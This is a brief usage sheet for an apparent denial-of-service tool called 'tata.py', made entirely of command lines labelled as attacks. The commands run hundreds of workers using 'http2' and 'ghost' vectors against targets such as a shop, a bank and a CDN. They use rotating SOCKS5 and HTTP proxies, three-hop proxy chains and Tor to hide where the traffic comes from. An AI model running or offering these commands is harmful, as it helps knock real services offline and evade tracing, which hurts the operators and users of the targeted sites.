#basic attack (no proxy)
python3 tata.py --target shop.example.com --port 443 --vectors http2 ghost --workers 500 --duration 120

#with socks5 proxies
python3 tata.py --target api.test.com --proxy-file proxies.txt --proxy-type socks5 --proxy-rotation random --workers 200

#with http proxies & sticky session
python3 tata.py --target bank.com --proxy-file http_proxies.txt --proxy-type http --sticky-proxy --duration 60

#proxy chaining (3 hops)
python3 tata.py --target secure.com --proxy-file premium.txt --proxy-type socks5 --chain-length 3 --proxy-rotation latency-based

#Tor mode
# Requires Tor running on localhost:9050
python3 tata.py --target darkweb.onion --tor --duration 30

#with proxy refresh 
python3 tata.py --target cdn.com --proxy-file proxies.txt --proxy-type socks5 --proxy-refresh 60 --duration 300

#Dry run (local testing)
python3 tata.py --target 127.0.0.1 --port 8080 --vectors all --dry-run --duration 10
